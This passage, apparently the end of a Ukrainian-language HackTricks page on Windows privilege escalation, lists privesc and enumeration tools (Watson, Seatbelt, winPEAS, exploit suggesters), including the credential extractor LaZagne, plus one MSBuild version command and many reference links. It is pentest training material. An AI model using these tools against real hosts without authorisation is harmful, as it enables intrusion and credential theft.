[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Шукає відомі vulnerabilities для privesc (DEPRECATED для Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Шукає відомі vulnerabilities для privesc (потрібно скомпілювати за допомогою VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Виконує enumeration host, шукаючи misconfigurations (більше tool для збору інформації, ніж для privesc) (потрібно скомпілювати) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує credentials із великої кількості software (precompiled exe у github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевіряє misconfiguration (precompiled executable у github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевіряє можливі misconfigurations (exe із python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, створений на основі цього допису (для коректної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** і рекомендує working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** і рекомендує working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати project, використовуючи правильну версію .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену версію .NET на victim host, можна виконати:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Посилання

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: фішинг через Word VBA macro та SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) і крадіжка kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – переслідування Silver Fox: гра в кішки-мишки в Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – уразливість привілейованої файлової системи в SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Посилання в минуле. Зловживання Symbolic Links у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: небезпечне розв’язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - завдання контрольного списку C/C++, розв’язані](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
